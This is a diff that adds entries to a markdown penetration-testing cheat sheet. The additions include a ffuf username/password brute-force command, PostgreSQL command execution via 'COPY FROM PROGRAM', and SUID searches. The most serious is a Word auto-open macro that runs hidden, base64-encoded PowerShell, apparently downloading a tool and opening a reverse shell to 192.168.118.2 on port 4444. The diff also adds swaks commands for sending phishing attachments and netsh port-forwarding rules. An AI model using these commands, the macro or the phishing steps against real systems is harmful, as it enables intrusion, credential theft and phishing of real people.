@@ -1233,6 +1233,11 @@ ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -
 ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http://<RHOST>/backups/backup_2020070416FUZZ.zip
 ```
 
+##### User/Pass fuzzing
+```
+ffuf -request request.txt -request-proto http -mode clusterbomb -w /path/to/users/file.txt:USERFUZZ -w /path/to/password/file.txt:PASSFUZZ -mc 200
+```
+
 ##### API Fuzzing
 
 ```c
@@ -2216,6 +2221,15 @@ postgres=# \q                        // quit
 <DATABASE>=# SELECT * FROM users;    // select everything from users table
 <DATABASE>=# SHOW rds.extensions;    // list installed extensions
 <DATABASE>=# SELECT usename, passwd from pg_shadow;    // read credentials
+```
+
+##### Command Execution
+```c
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'id';
+SELECT * FROM cmd_exec;
+DROP TABLE IF EXISTS cmd_exec
 ```
 
 #### Redis
@@ -3816,6 +3830,8 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 find / -cmin -60    // find files changed within the last 60 minutes
 find / -amin -60    // find files accesses within the last 60 minutes
 find ./ -type f -exec grep --color=always -i -I 'password' {} \;    // search for passwords
+find / -perm -u=s -type f 2>/dev/null // find suids
+find / -perm -04000 -ls // another way
 ```
 
 ##### grep for Passwords
@@ -4124,6 +4140,7 @@ sc qc <SERVICE>
 netsh firewall show state
 schtasks /query /fo LIST /v
 schtasks /query /v /fo LIST | findstr <USERNAME>
+Get-ScheduledTask
 findstr /si password *.xml *.ini *.txt
 dir /s *pass* == *cred* == *vnc* == *.config*
 accesschk.exe -uws "Everyone" "C:\Program Files\"
@@ -4195,6 +4212,37 @@ C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
 </libraryDescription>
 ```
 
+##### Phishing - Abusing Office Macros
+```vb
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    
+    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
+        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
+        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
+    ...
+        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
+        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
+        Str = Str + "A== "
+
+    CreateObject("Wscript.Shell").Run Str
+End Sub
+```
+
+##### Phishing - SMTP Send email
+```c
+swaks --server=<IP> --from=<FROMADDR> --to=<TARGET ADDR> --auth LOGIN --auth-user <USERNAME> --auth-password <PASSWORD> --attach=@<FILE>
+smtptx -U <USER> -f <FROM> -t <TO> -P <PASSWORD> -S <SERVER> -a <FILE> -s <SUBJECT> -m <MESSAGE> -v
+```
+
 ##### accesschk
 
 ###### Checking File Permissions
@@ -4252,6 +4300,12 @@ Enable-NetFirewallRule -DisplayGroup "Remote Desktop";
 netsh advfirewall firewall add rule action=allow name=tunnelI dir=in protocal=tcp localport='80,443,1337,4444'
 netsh advfirewall firewall add rule action=allow name=tunnelO dir=out protocal=tcp remoteport='80,443,1337,4444'
 
+```
+
+##### Port forwarding
+```
+netsh interface portproxy add v4tov4 listenport=<PORT> listenaddress=<LISTEN ADDR> connectport=<TARGET PORT> connectaddress=<TARGET ADDR>
+netsh advfirewall firewall add rule name=<NAME> protocol=TCP dir=in localip=<BOUND IP> localport=<PORT> action=allow
 ```
 
 ##### Privileges and Permissions
